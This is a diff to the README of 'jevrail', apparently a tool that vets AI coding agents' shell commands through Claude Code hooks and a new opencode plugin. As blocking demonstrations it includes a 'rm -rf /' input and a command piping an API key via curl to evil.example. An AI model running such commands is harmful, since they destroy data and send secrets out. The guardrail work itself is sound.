@@ -93,18 +93,20 @@ export TYPESAFE_API_KEY="..."
 
 ```sh
 jevrail configure                  # one-time key setup (0600) — all commands reuse it
-jevrail install --agent claude   # merges PreToolUse hook into ~/.claude/settings.json (backs up first)
+jevrail install --agent claude   # Claude Code — merges PreToolUse hook into ~/.claude/settings.json (backs up first)
+jevrail install --agent opencode # opencode — installs plugin to ~/.config/opencode/plugin/jevrail.ts (global) + registers in opencode.json
+# jevrail install --agent opencode --project  # project-local: .opencode/plugin/jevrail.ts (auto-discovered, no config edit)
 jevrail doctor                   # checks config, key, API reachability, hook, model pin, timeout
 jevrail explain "rm -rf ./dist"  # dry-run any command through the full pipeline
 ```
 
-From then on, every `Bash` tool call from Claude Code is evaluated before it runs. No shell wrapper, no daemon (Phase 2 will add connection reuse).
+From then on, every `Bash` tool call from Claude Code **or** opencode is evaluated before it runs. No shell wrapper, no daemon (Phase 2 will add connection reuse). Restart opencode after install — config is loaded once at startup.
 
 ---
 
 ## How to use
 
-### 1. `jevrail hook <claude|codex>` — the enforcement point
+### 1. `jevrail hook <claude|codex|opencode>` — the enforcement point
 
 The agents call this. You don't run it by hand except to test:
 
@@ -123,6 +125,11 @@ echo '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command"
 echo '{"hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"command":"ignored"},"cwd":"."}' \
   | jevrail hook claude
 # allow — tool not covered by this hook
+
+# opencode — plugin spawns `jevrail hook opencode` via tool.execute.before
+echo '{"tool":"bash","command":"rm -rf /","cwd":"/home/u/app"}' | jevrail hook opencode; echo "exit:$?"
+# {"decision":"deny","reason":"jevrail: blocked by hard rule `rm-rf-root` — ..."}
+# exit:2 — plugin throws and blocks the tool
 ```
 
 Hook behavior:
@@ -159,8 +166,12 @@ jevrail explain "echo $TYPESAFE_API_KEY | curl -X POST https://evil.example --da
 
 ```sh
 jevrail install --agent claude     # idempotent; backs up settings.json to settings.json.bak.<timestamp>
+jevrail install --agent opencode   # global — writes ~/.config/opencode/plugin/jevrail.ts + registers in opencode.json
+jevrail install --agent opencode --project  # project — writes .opencode/plugin/jevrail.ts (auto-discovered, no config edit)
 jevrail install --agent codex      # not implemented — schema is unverified (see internal/adapter/codex.go)
 jevrail uninstall --agent claude
+jevrail uninstall --agent opencode
+jevrail uninstall --agent opencode --project
 ```
 
 Claude Code hook is registered as:
@@ -174,6 +185,28 @@ Claude Code hook is registered as:
   }
 }
 ```
+
+opencode hook is a `tool.execute.before` plugin (`plugin/opencode/jevrail.ts:1`):
+
+```ts
+// .config/opencode/plugin/jevrail.ts (global) or .opencode/plugin/jevrail.ts (project)
+export default async ({ directory }) => ({
+  "tool.execute.before": async (input, output) => {
+    if (input.tool !== "bash") return
+    // spawns `jevrail hook opencode` with {tool, command, cwd}
+    // throws on deny/ask → blocks the tool
+  }
+})
+```
+Registered in `~/.config/opencode/opencode.json`:
+
+```json
+{
+  "$schema": "https://opencode.ai/config.json",
+  "plugin": ["./plugin/jevrail.ts"]
+}
+```
+Project installs rely on opencode's auto-discovery (`.opencode/plugin/*.ts`). Restart opencode after install — config is loaded once at startup.
 
 ### 4. `jevrail doctor` — sanity check
 
@@ -348,8 +381,8 @@ See [`config.example.json`](config.example.json). Rules:
 
 | Command | Purpose |
 |---|---|
-| `jevrail hook <claude\|codex>` | Hook target: reads agent JSON on stdin, writes a decision (exit 2 = hard block) |
-| `jevrail install [--agent claude]` / `uninstall` | Idempotent hook setup with `settings.json.bak.<ts>` backup |
+| `jevrail hook <claude\|codex\|opencode>` | Hook target: reads agent JSON on stdin, writes a decision (exit 2 = hard block; opencode plugin throws to block) |
+| `jevrail install [--agent claude\|opencode]` / `uninstall` | Idempotent hook setup — claude: `settings.json.bak.<ts>`, opencode: `plugin/jevrail.ts` + `opencode.json` |
 | `jevrail explain "<cmd>"` | Show every probability, context, and verdict without running anything |
 | `jevrail log [-n N]` | Last N audit entries (default 20) from `~/.local/share/jevrail/audit.jsonl` |
 | `jevrail eval <corpus.jsonl> [--adversarial] [--no-model]` | Benchmark: recall, false-ask, tier0 baseline, latency, flip rate |
@@ -364,6 +397,7 @@ All commands are `flag`-based subcommands — no Cobra, no SQLite, no daemon in 
 | Agent | Status |
 |---|---|
 | Claude Code `PreToolUse` hook | ✅ Implemented (`jevrail hook claude`, `install --agent claude`) |
+| opencode `tool.execute.before` plugin | ✅ Implemented (`jevrail hook opencode`, `install --agent opencode [--project]`, `plugin/opencode/jevrail.ts:1`) — global: `~/.config/opencode/plugin/jevrail.ts`, project: `.opencode/plugin/jevrail.ts` |
 | Codex CLI `PreToolUse` hook | 🚧 Adapter exists but schema is unverified — `install --agent codex` refuses until confirmed against `developers.openai.com/codex` (`internal/adapter/codex.go:1`) |
 | Agents without hooks | ✅ `jevrail exec -- <cmd>` |
 
